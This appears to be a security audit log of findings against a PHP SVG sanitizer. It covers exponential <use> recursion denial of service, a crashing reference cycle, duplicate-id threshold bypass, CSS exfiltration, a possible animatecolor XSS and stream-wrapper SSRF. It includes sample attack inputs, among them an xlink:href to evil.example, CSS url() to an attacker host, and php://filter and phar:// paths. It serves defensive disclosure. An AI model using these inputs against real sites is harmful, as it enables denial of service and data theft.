finding.claim: Algorithmic CPU DoS: hasInfiniteLoop() enumerates every <use> path with no visited set or memoization, so a layered DAG of <use> references costs about width^depth calls. Depth 15 with width 3-4 (about 60 <g id> groups, about 240 <use>, roughly 20 KB) is enough to stall sanitize(). Plausible; verified by reading, not executed.
finding.source: Attacker-supplied SVG bytes: <g id> groups each containing several <use href="#..."> pointing at distinct ids in the next layer.
finding.sink: Subject::hasInfiniteLoop recursion (Subject.php:71) reached from Resolver::determineInvalidSubjects, which runs for every subject on every sanitize() call.

only cycle check is in_array against the current path, not a visited set
iterates every useCollection entry
recurses into each target with no memoization, so the cost is width^depth

finding.guards_checked: Nesting limit Subject.php:62 (level > 15 throws) bounds depth, not breadth; all paths of depth <=15 are still enumerated. The cycle check (Subject.php:66) does not prune DAG revisits. useThreshold (Sanitizer.php:683, 692) runs later in startClean and its countUse (Subject.php:118) is also unmemoized and exponential. Default threshold is 1000 but does not cap work already spent in determineInvalidSubjects.

finding.claim: Cycle survives reference analysis, then countUse() recurses forever and the PHP process dies with a fatal error. determineInvalidSubjects skips subjects already in elementsToRemove without clearing their outgoing edges, so a two-node cycle whose members were both added as targets of other invalid subjects remains intact. Plausible; verified by reading, not executed.

isUseTagExceedingThreshold -> findByElementId(B)
B->countUse() -> A->countUse() -> B ... infinite recursion, no depth or visited guard

finding.guards_checked: Cycle detection runs in determineInvalidSubjects (Resolver.php:141-145) but the edge-clearing step is bypassed for subjects in elementsToRemove (Resolver.php:132-134). countUse has no cycle guard (Subject.php:114-122). isUseTagExceedingThreshold does not short-circuit on cycles. useThreshold>0 is the default, so the path is live.

finding.claim: Duplicate ids overwrite the registry, so the earlier copies' <use> edges are never counted. Any amplification placed inside a non-last duplicate is invisible to useThreshold, which can then be bypassed. Browsers resolve #id to the first element in tree order, so the rendered expansion uses the hidden copies. Plausible; verified by reading, not executed.
finding.source: Attacker SVG with each group id written twice: first copy holds 10 <use> to the next group's id, second (registered) copy is empty.
finding.sink: Rendering expansion in the consumer (the sanitizer's own budget check is what gets bypassed). Also no sanitizer-side cost is charged.

trace.note: //*[@id] query returns both copies in document order
$this->subjects[id] = new Subject(...) overwrites; the first copy is dropped and never registered
processReferences iterates only registered subjects, so uses inside the dropped copy never get addUse
threshold check uses findByElementId(target) -> registered empty copy -> countUse() == 0
0 >= 1000 is false, so the <use> is kept

finding.guards_checked: useThreshold (Sanitizer.php:692-694) and the nesting limit (Subject.php:62) both rely on the registry and cannot see dropped copies. The output is serialized unchanged apart from removals (Sanitizer.php:254-256). No duplicate-id check exists anywhere.

finding.claim: Nesting-limit handling removes the wrong element. On NestingException the subject that is added to elementsToRemove is usually a <g>, and startClean only removes nodes named 'use', so the deep <use> chain survives. Expansion protection then depends entirely on useThreshold; setting it to 0 disables all protection. Config-dependent; verified by reading.
finding.source: Attacker SVG: a chain of more than 15 nested <g id> subjects with <use> between them; plus an application that calls setUseThreshold(0) or otherwise disables the threshold.
finding.sink: startClean removal condition (Sanitizer.php:332) matches only 'use' nodes, so exponential <use> expansion is emitted in the output.

catch block

removal test requires nodeName === 'use', so the <g> is not removed and the uses in the chain are not removed
useThreshold <= 0 returns false, so the only other control is off

finding.guards_checked: The nesting limit only removes <use> when the exception subject is itself a <use id>. The threshold (Sanitizer.php:692-694) is the only effective control for <g>-based chains, and it is disabled when useThreshold <= 0 (Sanitizer.php:683-685).

finding.claim: Unsanitized <style> content and CSS url() values are not checked by removeRemoteReferences. Inline SVG <style> is document-global CSS in the host page, so attacker CSS can restyle or overlay the page and exfiltrate attribute values via selectors and remote url(). Impact depends on whether the consumer inlines the SVG. Verified by reading.
finding.source: Attacker SVG: <style> with @import or background:url(https://attacker/...) rules.
finding.sink: Serialized output at Sanitizer.php:254-256 keeps the style text; consumer inlines it into an HTML page.

trace.note: 'style' is an allowed tag
cleanUnsafeNodes keeps DOMText children, so style text survives
removeRemoteReferences only runs on attribute values in cleanAttributesOnWhitelist, never on element text
serialized output includes the style block

finding.guards_checked: Tag allowlist (AllowedTags.php) allows style. No CSS parser or sanitizer exists. removeRemoteReferences (Sanitizer.php:177-179) is off by default and in any case covers attributes only. Script handlers and href schemes are blocked, so this is CSS-only.

finding.claim: Possible XSS bypass if a browser animates href via <animatecolor>. The tag is allowed while <animate> and <set> are blocked, and the href check inspects only attributes whose names contain 'href', so an animated values='javascript:...' is not checked. Requires browser verification; I did not confirm that any engine honours animateColor for href.

finding.guards_checked: Event handler attributes are not allowed (AllowedAttributes.php has no on* entries). <set> and <animate> are absent. isHrefSafeValue (Sanitizer.php:523-573) blocks javascript: on real href attributes only. Not verified: whether animatecolor is rendered or animates href in current browsers.

finding.claim: Reference-precedence mismatch. The sanitizer's <use> dirty check uses href first, but each attribute is safety-checked separately. <use href="#ok" xlink:href="https://evil.example/x.svg#a"/> passes both checks and keeps the remote xlink:href. Browsers that prefer href are safe; renderers that prefer xlink:href load a remote document. Low impact.
finding.source: Attacker SVG: <use> carrying both href and xlink:href, with xlink:href pointing to an http(s) URL.
finding.sink: Renderer that resolves xlink:href for <use>, fetching a remote SVG document.

trace.note: getElementHref returns href before xlink:href
isUseTagDirty uses Helper, sees '#ok', not dirty
isHrefSafeValue allows https:// and http:// on xlink:href
remote xlink:href remains in output

finding.guards_checked: isUseTagDirty (Sanitizer.php:667-671) and cleanXlinkHrefs (Sanitizer.php:462-475). The remote xlink:href is not removed because http(s) is allowed. Attacker-controlled href is checked before the dirty check, so the normalization case is handled.

finding.claim: file_get_contents on caller-supplied paths honours stream wrappers. If any wrapper or service passes untrusted names to this CLI with allow_url_fopen enabled, it can be used for SSRF (http://) or local file/phar reads (php://filter, phar://). Conditional on an external caller that is not in this repo.
